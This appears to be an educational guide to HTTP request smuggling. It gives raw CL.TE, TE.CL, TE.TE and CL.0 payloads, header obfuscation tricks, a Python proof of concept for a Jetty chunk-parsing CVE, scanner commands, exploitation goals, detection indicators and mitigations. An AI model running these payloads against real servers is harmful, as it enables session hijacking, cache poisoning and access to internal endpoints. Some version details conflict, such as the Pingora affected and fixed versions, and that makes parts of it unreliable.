# HTTP Request Smuggling: Complete Exploitation Methodology

## Introduction

HTTP request smuggling is a technique that exploits inconsistencies between how front-end servers (like load balancers, reverse proxies, CDNs) and back-end servers process HTTP requests. When these servers disagree on where one request ends and the next begins, attackers can "smuggle" malicious requests that bypass security controls.

The vulnerability was first discovered in 2005 and has seen a significant resurgence since 2019. Recent high-profile vulnerabilities include CVE-2025-55315 in ASP.NET Core Kestrel (CVSS 9.9), CVE-2026-2332 in Eclipse Jetty, and CVE-2025-4366 in Cloudflare's Pingora framework .

---

## Understanding the Root Cause

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends:

**Content-Length header** - Specifies the message body length in bytes:
```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 11

q=smuggling
```

**Transfer-Encoding header** - Uses chunked encoding where each chunk has a size in hex:
```http
POST /search HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

b
q=smuggling
0

```

When both headers are present, the HTTP specification says Content-Length should be ignored. However, different servers implement this inconsistently, creating smuggling opportunities .

---

## Attack Classification

There are three main smuggling variants:

### 1. CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

The front-end server reads the Content-Length header to determine request boundaries, while the back-end server honors Transfer-Encoding.

### 2. TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

The front-end processes chunked encoding correctly, but the back-end relies on Content-Length.

### 3. TE.TE (Obfuscated Transfer-Encoding)

Both servers support Transfer-Encoding, but header obfuscation causes one server to ignore it.

---

## Testing Methodology

### Step 1: Initial Setup in Burp Suite

Before testing, configure Burp Suite properly:

1. **Disable "Update Content-Length"** - Go to Repeater menu and uncheck this option. Burp automatically updates Content-Length headers by default, which will break smuggling payloads .

2. **Switch to HTTP/1.1** - From the Inspector panel's Request Attributes section, change the protocol from HTTP/2 to HTTP/1.1. Many smuggling techniques only work with HTTP/1.1 .

3. **Enable ALPN override** (for HTTP/2 testing) - In Repeater menu, check "Allow HTTP/2 ALPN override" to test hidden HTTP/2 support .

### Step 2: CL.TE Detection

Send this request twice using Burp Repeater:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**What to observe:** The second response should show an error like "Unrecognized method GPOST". This confirms the smuggled "G" was prepended to the next request, changing POST to GPOST .

**Why this works:** 
- Front-end sees Content-Length: 6 and forwards the entire request including "0\r\n\r\nG"
- Back-end sees Transfer-Encoding, processes the "0" chunk as request termination, and treats "G" as the start of the next request

### Step 3: TE.CL Detection

With "Update Content-Length" disabled in Burp Repeater, send this request twice:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Important:** Include the trailing `\r\n\r\n` after the final "0" .

**What to observe:** The second response should indicate the server received GPOST instead of POST.

**Why this works:**
- Front-end sees Transfer-Encoding and processes chunked encoding, reading up to the final "0"
- Back-end uses Content-Length: 4, stops after "5c\r\n", and interprets the remaining content as a separate request

### Step 4: TE.TE (Obfuscation) Detection

When both servers support Transfer-Encoding, obfuscate the header to confuse one server:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Common obfuscation techniques** :
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked` (space before colon)
- `Transfer-Encoding: chunked` (tab instead of space)
- `X: X[\n]Transfer-Encoding: chunked` (CRLF injection)
- `Transfer-Encoding\r\n: chunked` (line break manipulation)

---

## Real-World Exploitation Examples

### Example 1: Classic Session Hijacking (PortSwigger Labs)

The PortSwigger labs demonstrate basic exploitation where smuggling changes the request method from POST to GPOST. This proves the smuggling primitive works before advancing to more complex attacks .

### Example 2: CVE-2026-2332 - Eclipse Jetty "Funky Chunks" (2026)

This vulnerability affected Eclipse Jetty versions 9.4.0 through 12.1.6. The flaw involved how Jetty parsed quoted strings in chunk extensions .

**Vulnerable parser behavior:** Jetty terminated chunk header parsing at `\r\n` inside quoted strings instead of treating this as an error.

**Proof of Concept (Python):**

```python
#!/usr/bin/env python3
import socket

payload = (
    b"POST / HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b'1;a="\r\n'
    b"X\r\n"
    b"0\r\n"
    b"\r\n"
    b"GET /smuggled HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Length: 11\r\n"
    b"\r\n"
    b'"\r\n'
    b"Y\r\n"
    b"0\r\n"
    b"\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(3)
sock.connect(("127.0.0.1", 8080))
sock.sendall(payload)

response = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    except socket.timeout:
        break

sock.close()
print(f"Responses received: {response.count(b'HTTP/')}")
```

**Result:** The vulnerable Jetty server returned two HTTP responses from a single TCP connection, confirming successful request smuggling .

**Fixed versions:**
- Jetty 12.1.7+
- Jetty 12.0.33+
- Jetty 11.0.28+
- Jetty 10.0.28+
- Jetty 9.4.60+

### Example 3: CVE-2025-4366 - Cloudflare Pingora (2025)

This vulnerability affected Pingora OSS framework versions before 0.5.0. When caching was enabled, Pingora skipped proper request body consumption logic on cache hits .

**Attack Request:**
```http
GET /attack/foo.jpg HTTP/1.1
Host: example.com
content-length: 79

GET / HTTP/1.1
Host: attacker.example.com
Bogus: foo
```

**Impact:** When a subsequent request was sent on the same reused connection, the smuggled request was interpreted as the beginning of the next request, allowing header and URL injection .

**Fixed version:** Pingora v0.8.0 or higher

### Example 4: CVE-2025-58056 - Netty Chunk Extension Parsing (2025)

Netty's chunk extension parsing flaw allowed request smuggling when paired with certain reverse proxies. Netty interpreted a newline character (LF) in a chunk extension as the end of the chunk-size line regardless of whether a CR preceded it .

**Malicious Request:**
```http
POST /one HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

48;\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n0

POST /two HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

0

```

**Fixed versions:** Netty 4.1.125.Final and 4.2.5.Final 

---

## Automated Testing Tools

### Tool 1: Burp Suite HTTP Request Smuggler Extension (Recommended)

This is the most comprehensive tool for smuggling detection.

**Installation:** Download from BApp Store within Burp Suite.

**Usage for CL.0 detection** :

1. Import your target URLs into Burp's sitemap
2. Disable Live Audit from Proxy checks to improve performance
3. Configure passive crawl to only collect "Links" and "The item itself"
4. Select all targets, right-click, choose "Request Smuggler" > "cl.0"
5. Select detection gadgets: nameprefix, nameprefix2, options, head
6. Click OK to start scanning

Positive results appear in the Burp UI with clear indicators .

### Tool 2: Smuggler (Python)

```bash
# Installation
git clone https://github.com/defparam/smuggler
cd smuggler

# Basic usage
python3 smuggler.py -u https://target.com

# With proxy (for Burp integration)
python3 smuggler.py -u https://target.com --proxy http://127.0.0.1:8080
```

### Tool 3: http-request-smuggling

```bash
git clone https://github.com/anshumanpattnaik/http-request-smuggling
cd http-request-smuggling
python3 smuggle.py -u https://target.com
```

### Tool 4: H2C Smuggler (for HTTP/2)

```bash
go run ./cmd/h2csmuggler check https://target.com http://localhost
```

---

## Advanced Exploitation Techniques

### CL.0 Smuggling (Content-Length Zero)

CL.0 is a modern smuggling variant that doesn't require Transfer-Encoding headers. It exploits the fact that some front-end servers ignore Content-Length on GET requests while back-ends respect it .

**Discovery methodology using Burp** :

1. Enumerate domains using tools like chaos-client or subfinder
2. Filter for CDN providers (Akamai, Azure, Cloudflare)
3. Test endpoints using the Request Smuggler extension's cl.0 option
4. Look for responses that indicate desynchronization (301 redirects with smuggled content in Location header)

**Example CL.0 gadget:**
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 55

GET /admin HTTP/1.1
Host: target.com
```

### HTTP/2 Downgrade Smuggling

When front-end servers speak HTTP/2 but back-ends expect HTTP/1.1, downgrade smuggling becomes possible. Attackers can inject CRLF sequences within HTTP/2 header values that become newlines when downgraded .

**Testing approach in Burp** :

1. Switch to HTTP/2 view in Inspector
2. Inject CRLF using Shift+Return in header values
3. Monitor how the downgraded HTTP/1.1 request appears
4. Look for smuggled headers reaching the back-end

**Key indicators of vulnerability** :
- Inconsistent responses across identical requests
- Unexpected 404 or 400 responses
- Delayed or mismatched responses
- Cross-user response leakage

---

## Building a Detection and Exploitation Workflow

### Phase 1: Reconnaissance

1. Identify target infrastructure (CDN, load balancer, proxy)
2. Map all endpoints that accept user input
3. Test HTTP version support (HTTP/1.1 and HTTP/2)

### Phase 2: Smuggling Detection

Use Burp Suite's Request Smuggler extension for automated detection across:
- CL.TE variants
- TE.CL variants  
- TE.TE obfuscation variants
- CL.0 gadgets

### Phase 3: Confirmation

Manually verify each positive using the appropriate test payload:
- For CL.TE: Send the "0\r\n\r\nG" payload twice
- For TE.CL: Send the "5c\r\nGPOST" payload twice
- For TE.TE: Test multiple obfuscation headers

### Phase 4: Exploitation

Once confirmed, craft exploitation payloads targeting specific goals:

**Session hijacking:** Smuggle a request that captures victim cookies
**Cache poisoning:** Smuggle responses that poison shared caches
**WAF bypass:** Smuggle requests that would normally be blocked
**Internal access:** Smuggle requests to internal-only endpoints

---

## Indicators of Compromise (IoC)

Monitor for these signs of request smuggling attacks:

1. **Log anomalies** - HTTP requests appearing in back-end logs without corresponding front-end access logs
2. **Unexpected redirects** - Users being redirected to attacker-controlled locations
3. **Cache inconsistencies** - Different users receiving different responses for the same URL
4. **Protocol anomalies** - Requests with both Content-Length and Transfer-Encoding headers
5. **Malformed headers** - Unusual whitespace, duplicate headers, or line break characters in header values 

---

## Mitigation Recommendations

1. **Patch vulnerable components immediately** - Update to the latest patched versions
2. **Disable connection pooling** as a temporary workaround
3. **Migrate to HTTP/2 end-to-end** - HTTP/2 uses binary framing, eliminating ambiguous parsing 
4. **Implement strict RFC-compliant parsing** across all infrastructure components
5. **Deploy a reverse proxy** that properly handles HTTP semantics
6. **Monitor for smuggling indicators** using log correlation between proxy and back-end servers

---

## References

- PortSwigger Research: HTTP Desync Attacks (James Kettle, 2019-2022)
- "Funky Chunks" research series - w4ke.info (2025)
- CVE-2026-2332 - Eclipse Jetty Vulnerability
- CVE-2025-4366 - Cloudflare Pingora Vulnerability
- OWASP Web Security Testing Guide - Testing for HTTP Request Smuggling 
